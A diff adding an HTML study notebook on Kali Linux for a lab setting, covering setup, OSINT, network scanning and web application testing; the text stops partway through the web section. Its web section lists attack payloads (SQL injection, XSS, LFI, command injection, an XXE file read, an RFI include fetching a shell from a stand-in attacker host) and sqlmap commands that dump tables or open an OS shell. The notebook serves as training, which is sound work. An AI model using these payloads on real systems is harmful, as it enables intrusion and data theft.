@@ -1,0 +1,1507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kali Linux — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    .xref { display:inline; color:var(--accent,#3b82f6); font-size:.75em; font-weight:600; border:1px solid var(--accent,#3b82f6); border-radius:3px; padding:1px 5px; margin-left:4px; text-decoration:none; cursor:pointer; white-space:nowrap; opacity:.85; }
+    .xref:hover { background:rgba(59,130,246,.15); opacity:1; }
+    .xref-group { color:#8b949e; font-size:.82em; margin-left:2px; }
+    td .xref-group { display:block; margin-top:3px; }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <a href="index.html" class="nav-brand">
+    <span class="icon">⬡</span> SOC Notes
+  </a>
+  <button id="sb-toggle" class="nav-toggle" onclick="toggleSidebar()">☰</button>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="elk.html">ELK Stack</a>
+    <a href="openvas.html">OpenVAS</a>
+    <a href="kali.html" class="active">Kali Linux</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="wireshark.html">Wireshark</a>
+    <a href="snort.html">Snort</a>
+    <a href="ossec.html">OSSEC</a>
+    <a href="log-sources.html">Log Sources</a>
+  </div>
+</nav>
+
+<div class="layout">
+  <aside id="sb" class="sidebar">
+    <div class="sb-title">Kali Linux</div>
+    <nav id="sb-nav"></nav>
+  </aside>
+
+  <main id="main" class="main">
+    <div id="content-area"></div>
+  </main>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 01 -->
+<template id="tpl-overview">
+<article class="topic">
+  <h2>Overview &amp; Environment Setup</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l2">L2 Data Link</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Kali Linux is a full-stack offensive toolkit — its 600+ tools span every OSI layer from L2 wireless attacks and ARP spoofing through L3/L4 network scanning to L7 web application testing and application-layer exploitation.</span>
+  </div>
+
+  <p>Kali Linux is a Debian-based distribution maintained by Offensive Security, purpose-built for penetration testing, CTF competitions, and authorized security assessments. It ships with 600+ tools pre-installed and receives rolling updates. <strong>Always obtain written authorization before testing any system you do not own.</strong></p>
+
+  <h3>Kali Editions</h3>
+  <table>
+    <thead><tr><th>Edition</th><th>Use Case</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td>Kali Installer (bare metal)</td><td>Dedicated pentest workstation</td><td>Full control, best performance; use separate physical machine</td></tr>
+      <tr><td>Kali VM (VMware / VirtualBox)</td><td>Lab environment</td><td>Snapshots for rollback; use NAT or Host-Only networking for isolation</td></tr>
+      <tr><td>Kali WSL2</td><td>Windows integration</td><td><code>kali-win-kex</code> for GUI; limited raw socket support (no monitor mode)</td></tr>
+      <tr><td>Kali NetHunter</td><td>Android mobile pentesting</td><td>Supports OTG adapters for wireless attacks</td></tr>
+      <tr><td>Kali Purple</td><td>Defensive / blue team variant</td><td>Adds defensive tools (Arkime, OpenVAS, Malcolm)</td></tr>
+    </tbody>
+  </table>
+
+  <h3>First-Run Setup Checklist</h3>
+  <pre><code># Update all packages
+sudo apt update && sudo apt full-upgrade -y
+
+# Install commonly needed extras
+sudo apt install -y seclists gobuster feroxbuster chisel bloodhound neo4j crackmapexec
+
+# Fix default credentials (critical — change immediately)
+passwd kali
+
+# Enable SSH if needed (disabled by default)
+sudo systemctl enable ssh --now
+
+# Install Kali metapackages (select your workload)
+sudo apt install -y kali-tools-top10       # top 10 tools
+sudo apt install -y kali-tools-web         # web app testing
+sudo apt install -y kali-tools-wireless    # wireless (needs compatible adapter)
+sudo apt install -y kali-tools-forensics   # digital forensics
+
+# Check kernel version (needed for some exploits)
+uname -r
+
+# Verify Python versions
+python3 --version && python2 --version 2>/dev/null || echo "python2 not installed"</code></pre>
+
+  <h3>Lab Network Layout (used throughout this notebook)</h3>
+  <table>
+    <thead><tr><th>Host</th><th>IP</th><th>Role</th></tr></thead>
+    <tbody>
+      <tr><td>Kali Linux</td><td>192.168.56.10</td><td>Attacker / pentest machine</td></tr>
+      <tr><td>Security Onion / Ubuntu</td><td>192.168.56.20</td><td>Defender / SIEM / NSM</td></tr>
+      <tr><td>Windows 10</td><td>192.168.56.30</td><td>Target — authorized test machine</td></tr>
+      <tr><td>Metasploitable 2</td><td>192.168.56.40</td><td>Optional — intentionally vulnerable Linux</td></tr>
+    </tbody>
+  </table>
+  <div class="callout note">
+    <strong>Host-Only Adapter:</strong> Set VMs to a Host-Only network (vboxnet0 / VMnet1) so attack traffic never reaches your real network. Kali gets a second NAT adapter for internet access to update tools.
+  </div>
+
+  <h3>Essential Kali Directories</h3>
+  <table>
+    <thead><tr><th>Path</th><th>Contents</th></tr></thead>
+    <tbody>
+      <tr><td><code>/usr/share/wordlists/</code></td><td>Bundled wordlists — rockyou.txt, dirbuster lists, fuzzdb</td></tr>
+      <tr><td><code>/usr/share/seclists/</code></td><td>SecLists (if installed) — comprehensive fuzzing wordlists</td></tr>
+      <tr><td><code>/usr/share/nmap/scripts/</code></td><td>NSE scripts organized by category</td></tr>
+      <tr><td><code>/usr/share/metasploit-framework/</code></td><td>Metasploit modules, data, plugins</td></tr>
+      <tr><td><code>/usr/share/exploitdb/</code></td><td>Local copy of Exploit-DB (searchsploit database)</td></tr>
+      <tr><td><code>/usr/share/webshells/</code></td><td>PHP, ASP, ASPX, JSP web shells for authorized testing</td></tr>
+      <tr><td><code>/opt/</code></td><td>Manually installed tools (impacket, bloodhound, etc.)</td></tr>
+    </tbody>
+  </table>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Setting up Kali in an isolated lab environment</h4>
+      <ul>
+        <li>Run Kali as a VirtualBox VM on a Host-Only network — this ensures all L2/L3 attack traffic stays isolated from your real network</li>
+        <li>Change the default kali/kali password immediately after first boot — the default credentials are public knowledge</li>
+        <li>Run <code>sudo apt update && sudo apt full-upgrade -y</code> before every lab session to ensure tools are current</li>
+      </ul>
+      <pre><code><span class="cm"># First-run setup — update, change password, verify Python</span>
+sudo apt update && sudo apt full-upgrade -y
+passwd kali
+python3 --version</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Installing and managing tool metapackages</h4>
+      <ul>
+        <li>Use Kali metapackages (<code>kali-tools-web</code>, <code>kali-tools-wireless</code>) to install curated tool sets rather than individual packages</li>
+        <li>Keep <code>/usr/share/seclists/</code> updated with <code>apt install seclists</code> — nearly every enumeration tool references these wordlists</li>
+      </ul>
+      <pre><code><span class="cm"># Install web app and wireless tool bundles</span>
+sudo apt install -y kali-tools-web kali-tools-wireless seclists gobuster feroxbuster
+<span class="cm"># Verify SecLists are available</span>
+ls /usr/share/seclists/Discovery/Web-Content/ | head -10</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Custom Kali builds and persistent configuration management</h4>
+      <ul>
+        <li>Build a custom Kali ISO with <code>kali-linux-build</code> to pre-install your tool set and configurations — reproducible pentest environments across team members</li>
+        <li>Version-control your Kali dotfiles (<code>.bashrc</code>, <code>.tmux.conf</code>, custom aliases) in a private Git repo and bootstrap new installs with a setup script</li>
+      </ul>
+      <pre><code><span class="cm"># Bootstrap script pattern — restore your config on a new Kali install</span>
+git clone https://github.com/youruser/kali-dotfiles.git ~/dotfiles
+~/dotfiles/install.sh
+<span class="cm"># Script installs: aliases, tmux config, custom wordlists, tool configs</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 02 -->
+<template id="tpl-recon">
+<article class="topic">
+  <h2>Recon &amp; OSINT</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">OSINT and passive recon operate at L7 — querying DNS (UDP/TCP port 53), HTTP/HTTPS APIs (Shodan, crt.sh), and extracting application-layer metadata from documents without sending any packets to the target.</span>
+  </div>
+  <p>Reconnaissance is the first phase of any engagement. Passive recon gathers intel without touching the target. Active recon sends packets and may appear in logs.
+    <a href="#" class="xref" onclick="loadTopic('scanning'); return false;">Active scanning ↗</a>
+  </p>
+
+  <h3>Passive OSINT — No Target Contact</h3>
+  <table>
+    <thead><tr><th>Tool</th><th>Command Example</th><th>What It Finds</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><code>whois</code></td>
+        <td><code>whois target.com</code></td>
+        <td>Registrar, creation date, nameservers, registrant org (if not privacy-protected)</td>
+      </tr>
+      <tr>
+        <td><code>nslookup / host / dig</code></td>
+        <td><code>dig target.com ANY +noall +answer</code><br><code>dig axfr @ns1.target.com target.com</code></td>
+        <td>DNS A/AAAA/MX/TXT/SPF records; zone transfer dumps full DNS zone if misconfigured</td>
+      </tr>
+      <tr>
+        <td><code>theHarvester</code></td>
+        <td><code>theHarvester -d target.com -b google,bing,crtsh -l 500</code></td>
+        <td>Email addresses, employee names, subdomains, IPs from search engines and cert transparency</td>
+      </tr>
+      <tr>
+        <td><code>sublist3r</code></td>
+        <td><code>sublist3r -d target.com -o subs.txt</code></td>
+        <td>Subdomain enumeration via passive DNS, VirusTotal, Netcraft, Google</td>
+      </tr>
+      <tr>
+        <td><code>crt.sh</code></td>
+        <td><code>curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u</code></td>
+        <td>Subdomains from SSL certificate transparency logs</td>
+      </tr>
+      <tr>
+        <td><code>shodan CLI</code></td>
+        <td><code>shodan search "org:Target Corp" --fields ip_str,port,hostnames</code></td>
+        <td>Publicly exposed services, banners, CVEs on target IP range (requires free account)</td>
+      </tr>
+      <tr>
+        <td><code>recon-ng</code></td>
+        <td><code>recon-ng -w target; marketplace install all; modules load ...</code></td>
+        <td>Modular OSINT framework — contacts, credentials, subdomains, geolocation</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>DNS Enumeration Deep-Dive</h3>
+  <pre><code># Standard record lookup
+dig target.com A
+dig target.com MX
+dig target.com TXT     # SPF, DKIM, DMARC, verification records
+dig target.com NS
+
+# Reverse PTR lookup
+dig -x 203.0.113.1
+
+# Zone transfer attempt (misconfigured DNS server returns entire zone)
+dig axfr @ns1.target.com target.com
+
+# dnsrecon — automated DNS enumeration
+dnsrecon -d target.com -t std        # standard records
+dnsrecon -d target.com -t axfr       # zone transfer
+dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+
+# DNSEnum — comprehensive DNS info + Google scraping
+dnsenum --dnsserver ns1.target.com --enum target.com</code></pre>
+
+  <h3>Google Dorks (passive, no direct contact)</h3>
+  <table>
+    <thead><tr><th>Dork</th><th>Finds</th></tr></thead>
+    <tbody>
+      <tr><td><code>site:target.com filetype:pdf</code></td><td>PDF documents (may contain author metadata)</td></tr>
+      <tr><td><code>site:target.com inurl:admin</code></td><td>Admin panels indexed by Google</td></tr>
+      <tr><td><code>site:target.com "not for public"</code></td><td>Accidentally indexed internal pages</td></tr>
+      <tr><td><code>intitle:"index of" site:target.com</code></td><td>Open directory listings</td></tr>
+      <tr><td><code>"@target.com" filetype:xls</code></td><td>Excel files with company email addresses</td></tr>
+      <tr><td><code>site:github.com "target.com" password</code></td><td>Leaked credentials on GitHub</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Metadata Extraction</h3>
+  <pre><code># ExifTool — extract metadata from downloaded files (PDFs, images, Office docs)
+exiftool report.pdf             # author, software, GPS, creation date
+exiftool -Author *.pdf          # batch — extract all authors
+exiftool -csv *.jpg > metadata.csv
+
+# FOCA-style metadata mining from downloaded docs
+for f in *.docx; do exiftool "$f" | grep -E "Author|Creator|Modified"; done
+
+# Strings — find embedded text in binaries
+strings -n 8 firmware.bin | grep -E "(password|admin|192\.168)"</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Passive DNS and WHOIS enumeration</h4>
+      <ul>
+        <li>Start with <code>whois</code> and <code>dig</code> — both query L7 services (WHOIS protocol port 43, DNS port 53) without touching the target directly</li>
+        <li>Always try a DNS zone transfer (<code>dig axfr</code>) — misconfigured authoritative DNS servers return the entire zone, mapping all subdomains and IPs</li>
+        <li>Use <code>theHarvester</code> to aggregate emails and subdomains from multiple passive sources in a single command</li>
+      </ul>
+      <pre><code><span class="cm"># Basic passive OSINT: WHOIS + DNS records + zone transfer attempt</span>
+whois target.com
+dig target.com ANY +noall +answer
+dig axfr @ns1.target.com target.com</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Certificate transparency and metadata extraction</h4>
+      <ul>
+        <li>Query crt.sh for subdomains via certificate transparency logs — often reveals staging and dev subdomains never advertised in DNS</li>
+        <li>Extract author metadata from downloaded PDFs and Office docs using <code>exiftool</code> — reveals employee names and internal software versions</li>
+      </ul>
+      <pre><code><span class="cm"># Enumerate subdomains via cert transparency logs</span>
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
+<span class="cm"># Extract metadata from all PDFs gathered during recon</span>
+exiftool -Author -Creator *.pdf 2>/dev/null</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Automated OSINT pipeline with recon-ng and Shodan</h4>
+      <ul>
+        <li>Build a recon-ng workspace that chains modules: domains → subdomains → IPs → Shodan enrichment → email harvest — all stored in a portable SQLite database</li>
+        <li>Use Shodan API to map the target's full IP range exposure: open ports, TLS certificate subjects, product banners, and known CVEs — before sending a single packet</li>
+      </ul>
+      <pre><code><span class="cm"># Recon-ng: load workspace and run subdomain → IP → Shodan pipeline</span>
+recon-ng -w target.com
+<span class="cm"># [recon-ng][target.com] > </span>
+marketplace install recon/domains-hosts/hackertarget
+marketplace install recon/hosts-ports/shodan_hostname
+modules load recon/domains-hosts/hackertarget
+options set SOURCE target.com
+run</code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 03 -->
+<template id="tpl-scanning">
+<article class="topic">
+  <h2>Network Scanning &amp; Enumeration</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l2">L2 Data Link</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-note">Network scanning begins at L2 with ARP discovery (same subnet), moves to L3 ICMP ping sweeps, and culminates at L4 with TCP SYN/connect scans and UDP probes to enumerate open ports and running services.</span>
+  </div>
+  <p>Active scanning identifies live hosts, open ports, and running services. All traffic is visible to IDS/NSM.
+    <a href="#" class="xref" onclick="loadTopic('recon'); return false;">Passive recon first ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('exploitation'); return false;">Move to exploitation ↗</a>
+  </p>
+
+  <h3>Host Discovery</h3>
+  <pre><code># ARP scan (Layer 2 — fastest, works only on local subnet)
+sudo arp-scan -l                          # scan local subnet
+sudo arp-scan 192.168.56.0/24             # specific range
+
+# netdiscover (passive ARP + active if needed)
+sudo netdiscover -r 192.168.56.0/24 -i eth0
+
+# Nmap ping sweep (no port scan)
+nmap -sn 192.168.56.0/24                  # ICMP + ARP on local net
+nmap -sn -PE -PP -PM 10.0.0.0/8          # ICMP echo/timestamp/mask (remote)
+nmap -sn --send-ip 192.168.56.0/24       # force IP-level ping (no ARP)
+
+# masscan — extremely fast (sends SYN packets at rate you specify)
+sudo masscan 192.168.56.0/24 -p1-65535 --rate=1000
+sudo masscan 10.0.0.0/8 -p80,443,22,3389 --rate=5000 -oL masscan.txt</code></pre>
+
+  <h3>Port &amp; Service Scanning</h3>
+  <pre><code># Standard service scan on discovered host
+nmap -sC -sV -O -p- 192.168.56.30 -oA nmap_full
+
+# Stealth SYN scan (default, requires root)
+sudo nmap -sS -T4 --min-rate 1000 192.168.56.30
+
+# UDP scan (slow but important — DNS 53, SNMP 161, TFTP 69)
+sudo nmap -sU --top-ports 100 192.168.56.30
+
+# Vulnerability scan with NSE
+nmap --script vuln 192.168.56.30
+nmap --script smb-vuln-ms17-010 192.168.56.30      # EternalBlue check
+nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi 192.168.56.30</code></pre>
+
+  <h3>Service-Specific Enumeration</h3>
+  <table>
+    <thead><tr><th>Service</th><th>Tool + Command</th><th>What to Look For</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><strong>SMB (445)</strong></td>
+        <td><code>enum4linux -a 192.168.56.30</code><br><code>smbclient -L //192.168.56.30/ -N</code><br><code>crackmapexec smb 192.168.56.30</code></td>
+        <td>Null sessions, share names, OS version, domain/workgroup, user enumeration, signing status</td>
+      </tr>
+      <tr>
+        <td><strong>LDAP (389/636)</strong></td>
+        <td><code>ldapsearch -x -H ldap://192.168.56.30 -b "dc=corp,dc=local"</code><br><code>nmap -p389 --script ldap-rootdse 192.168.56.30</code></td>
+        <td>Domain info, user listing, group membership, password policy (anonymous bind)</td>
+      </tr>
+      <tr>
+        <td><strong>FTP (21)</strong></td>
+        <td><code>ftp 192.168.56.30</code> (try user: anonymous, pass: anonymous)<br><code>nmap -p21 --script ftp-anon 192.168.56.30</code></td>
+        <td>Anonymous login allowed, writable directories, file listing</td>
+      </tr>
+      <tr>
+        <td><strong>SSH (22)</strong></td>
+        <td><code>ssh-audit 192.168.56.30</code><br><code>nmap -p22 --script ssh2-enum-algos 192.168.56.30</code></td>
+        <td>Supported key exchange / cipher algorithms, weak ciphers, version banner</td>
+      </tr>
+      <tr>
+        <td><strong>SNMP (161/UDP)</strong></td>
+        <td><code>snmpwalk -c public -v2c 192.168.56.30</code><br><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.56.30</code></td>
+        <td>Community strings (public/private), OID tree, running processes, network interfaces</td>
+      </tr>
+      <tr>
+        <td><strong>RDP (3389)</strong></td>
+        <td><code>nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 192.168.56.30</code></td>
+        <td>Encryption level, NLA required, BlueKeep (CVE-2019-0708) check</td>
+      </tr>
+      <tr>
+        <td><strong>WinRM (5985)</strong></td>
+        <td><code>crackmapexec winrm 192.168.56.30 -u user -p pass</code></td>
+        <td>Valid credentials for PowerShell remoting — high-value for post-exploitation</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Saving &amp; Parsing Nmap Output</h3>
+  <pre><code># Save in all formats simultaneously
+nmap -sC -sV -p- 192.168.56.30 -oA target_full
+# Creates: target_full.nmap, target_full.xml, target_full.gnmap
+
+# Parse with grep
+grep "open" target_full.gnmap
+grep "80/open\|443/open\|8080/open" target_full.gnmap   # web ports
+
+# Parse XML with python
+python3 -c "
+import xml.etree.ElementTree as ET
+tree = ET.parse('target_full.xml')
+for host in tree.findall('.//host'):
+    ip = host.find('.//address').get('addr')
+    for port in host.findall('.//port[@protocol=\"tcp\"]'):
+        state = port.find('state').get('state')
+        if state == 'open':
+            print(ip, port.get('portid'), port.find('service').get('name','?'))
+"</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Host discovery and service identification</h4>
+      <ul>
+        <li>Start with ARP scan (<code>arp-scan -l</code>) at L2 for the local subnet — faster and more reliable than ICMP on LAN segments</li>
+        <li>Follow host discovery with <code>nmap -sC -sV -O</code> to fingerprint L4 services — <code>-sC</code> runs default NSE scripts, <code>-sV</code> probes banners, <code>-O</code> fingerprints OS</li>
+        <li>Always save output with <code>-oA</code> to get all three formats (normal, XML, grepable) for later analysis</li>
+      </ul>
+      <pre><code><span class="cm"># L2 host discovery then full L4 service scan</span>
+sudo arp-scan 192.168.56.0/24
+nmap -sC -sV -O -p- 192.168.56.30 -oA lab_target --min-rate 1000</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Service-specific enumeration and UDP scanning</h4>
+      <ul>
+        <li>UDP services (DNS 53, SNMP 161, TFTP 69) are invisible to TCP-only scans — run <code>nmap -sU --top-ports 100</code> on every host</li>
+        <li>Use <code>enum4linux -a</code> and <code>crackmapexec smb</code> after finding TCP 445 — they extract SMB-specific data invisible to generic port scans</li>
+      </ul>
+      <pre><code><span class="cm"># UDP top 100 + SMB-specific enumeration after finding port 445</span>
+sudo nmap -sU --top-ports 100 192.168.56.30
+enum4linux -a 192.168.56.30 | tee enum4linux.txt
+crackmapexec smb 192.168.56.30</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>High-speed scanning large networks with masscan and NSE automation</h4>
+      <ul>
+        <li>Use masscan at high rate to get open port lists across large L3 networks, then feed those ports to nmap for deep L7 service fingerprinting — masscan for speed, nmap for accuracy</li>
+        <li>Automate vuln detection with targeted NSE scripts: <code>smb-vuln-ms17-010</code>, <code>rdp-vuln-ms12-020</code>, <code>http-shellshock</code> — run only against matching services</li>
+      </ul>
+      <pre><code><span class="cm"># masscan fast sweep then targeted nmap on discovered open ports</span>
+sudo masscan 192.168.56.0/24 -p1-65535 --rate=1000 -oL masscan.txt
+<span class="cm"># Extract port list and feed to nmap for service detection</span>
+awk '/open/ {print $3}' masscan.txt | sort -u | tr '\n' ',' | \
+  xargs -I{} nmap -sC -sV -p{} 192.168.56.30 -oA targeted_scan
+<span class="cm"># Targeted vuln check on EternalBlue</span>
+nmap -p445 --script smb-vuln-ms17-010 192.168.56.30</code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 04 -->
+<template id="tpl-webapp">
+<article class="topic">
+  <h2>Web Application Testing</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Web application testing operates entirely at L7 — directory brute-forcing, vulnerability scanning (Nikto), proxy interception (Burp Suite), and SQL injection all target the HTTP/HTTPS application layer on top of TCP 80/443.</span>
+  </div>
+  <p>Web app testing covers directory enumeration, vulnerability scanning, and manual exploitation of common flaws (OWASP Top 10). Requires written scope authorization.
+    <a href="#" class="xref" onclick="loadTopic('scanning'); return false;">Enumerate services first ↗</a>
+  </p>
+
+  <h3>Directory &amp; Content Discovery</h3>
+  <pre><code># gobuster — fast directory brute-force
+gobuster dir -u http://192.168.56.30/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak -t 50
+
+# feroxbuster — recursive directory brute-force
+feroxbuster -u http://192.168.56.30/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx -t 50 --auto-tune
+
+# dirb — classic simple scanner
+dirb http://192.168.56.30/ /usr/share/wordlists/dirb/common.txt
+
+# ffuf — fast web fuzzer (directories, params, vhosts)
+ffuf -u http://192.168.56.30/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
+ffuf -u http://192.168.56.30/ -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200   # vhost fuzzing</code></pre>
+
+  <h3>Nikto — Web Server Scanner</h3>
+  <pre><code># Basic scan
+nikto -h http://192.168.56.30/
+
+# Scan with authentication
+nikto -h http://192.168.56.30/ -id admin:password
+
+# Scan via proxy (Burp Suite)
+nikto -h http://192.168.56.30/ -useproxy http://127.0.0.1:8080
+
+# Save output
+nikto -h http://192.168.56.30/ -o nikto_output.html -Format htm</code></pre>
+
+  <h3>Burp Suite Workflow</h3>
+  <table>
+    <thead><tr><th>Feature</th><th>Purpose</th><th>Key Tip</th></tr></thead>
+    <tbody>
+      <tr><td>Proxy → Intercept</td><td>Capture and modify HTTP requests/responses</td><td>Set browser proxy to 127.0.0.1:8080; install Burp CA cert for HTTPS</td></tr>
+      <tr><td>Repeater</td><td>Manually re-send and modify individual requests</td><td>Send from Proxy → right-click → Send to Repeater; Ctrl+R to send</td></tr>
+      <tr><td>Intruder</td><td>Automated fuzzing — brute-force login, parameter manipulation</td><td>Mark injection points with §value§; use Sniper (1 position) or Cluster Bomb (multiple)</td></tr>
+      <tr><td>Scanner (Pro)</td><td>Automated vulnerability scan</td><td>Right-click request → Scan; results in Dashboard → Issue Activity</td></tr>
+      <tr><td>Spider / Crawler</td><td>Map all accessible endpoints</td><td>Right-click target in Site Map → Spider this host</td></tr>
+      <tr><td>Decoder</td><td>Encode/decode URL, Base64, HTML, hex</td><td>Ctrl+Shift+D; paste encoded value, select decode method</td></tr>
+    </tbody>
+  </table>
+
+  <h3>SQLmap — Automated SQL Injection</h3>
+  <pre><code># Basic GET parameter test
+sqlmap -u "http://192.168.56.30/page?id=1" --dbs
+
+# POST request (capture with Burp, save as request.txt)
+sqlmap -r request.txt --dbs --level 3 --risk 2
+
+# Enumerate tables in a database
+sqlmap -u "http://192.168.56.30/page?id=1" -D targetdb --tables
+
+# Dump table contents
+sqlmap -u "http://192.168.56.30/page?id=1" -D targetdb -T users --dump
+
+# OS shell (if DB user has FILE privilege on MySQL)
+sqlmap -u "http://192.168.56.30/page?id=1" --os-shell
+
+# Bypass WAF with tamper scripts
+sqlmap -u "http://192.168.56.30/page?id=1" --tamper=space2comment,randomcase --dbs</code></pre>
+
+  <h3>Common Manual Web Vulnerabilities</h3>
+  <table>
+    <thead><tr><th>Vulnerability</th><th>Test Payload</th><th>Impact</th></tr></thead>
+    <tbody>
+      <tr><td>SQL Injection</td><td><code>' OR 1=1--</code> in login fields; <code>1' AND SLEEP(5)--</code> for blind</td><td>Auth bypass, data exfil, RCE via INTO OUTFILE</td></tr>
+      <tr><td>XSS (Reflected)</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in search/URL params</td><td>Session hijack, credential theft, defacement</td></tr>
+      <tr><td>LFI</td><td><code>../../etc/passwd</code> in file/page parameters</td><td>Read arbitrary files; with log poisoning → RCE</td></tr>
+      <tr><td>RFI</td><td><code>http://attacker.com/shell.php</code> in include param</td><td>Remote code execution via attacker-hosted file</td></tr>
+      <tr><td>IDOR</td><td>Change <code>?user_id=1</code> to <code>?user_id=2</code></td><td>Access other users' data without authorization</td></tr>
+      <tr><td>Command Injection</td><td><code>127.0.0.1; whoami</code> in ping/lookup fields</td><td>OS command execution on the server</td></tr>
+      <tr><td>XXE</td><td>Inject external entity in XML upload: <code>&lt;!DOCTYPE x [&lt;!ENTITY xx SYSTEM "file:///etc/passwd"&gt;]&gt;</code></td><td>SSRF, file read, internal network pivot</td></tr>
+    </tbody>
+  </table>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Directory enumeration and Nikto web server scanning</h4>
+      <ul>
+        <li>Run <code>gobuster dir</code> against every web service found during L4 scanning — discovers hidden paths, admin panels, and backup files</li>
+        <li>Use Nikto for quick automated checks of common web server misconfigs and known CVEs at L7 before manual testing</li>
+        <li>Set up Burp Suite as a browser proxy to intercept L7 HTTP traffic — every request goes through Burp so you can inspect and modify it</li>
+      </ul>
+      <pre><code><span class="cm"># Directory enumeration then Nikto scan</span>
+gobuster dir -u http://192.168.56.30/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,html,txt -t 50
+nikto -h http://192.168.56.30/</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>SQLmap and manual web vulnerability testing</h4>
+      <ul>
+        <li>Capture a request with Burp Suite, save as <code>request.txt</code>, then feed to SQLmap — this tests the exact POST body with correct headers and cookies</li>
+        <li>Test OWASP Top 10 manually: try <code>' OR 1=1--</code> in all login fields, <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in search params, and <code>../../etc/passwd</code> in file parameters</li>
+      </ul>
+      <pre><code><span class="cm"># SQLmap from Burp-captured POST request</span>
+sqlmap -r request.txt --dbs --level 3 --risk 2
+<span class="cm"># Enumerate tables in discovered database</span>
+sqlmap -r request.txt -D targetdb --tables --dump</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>ffuf parameter fuzzing and virtual host discovery</h4>
+      <ul>
+        <li>Use ffuf for parameter fuzzing — test every GET/POST parameter for injection, LFI, and IDOR by fuzzing the parameter values with SecLists payloads</li>
+        <li>Virtual host fuzzing discovers hidden internal apps served on the same IP — many bug bounty and CTF targets have staging environments accessible only by <code>Host:</code> header manipulation</li>
+      </ul>
+      <pre><code><span class="cm"># ffuf: fuzz GET parameter values for LFI</span>
+ffuf -u "http://192.168.56.30/page?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -mc 200 -fs 1024
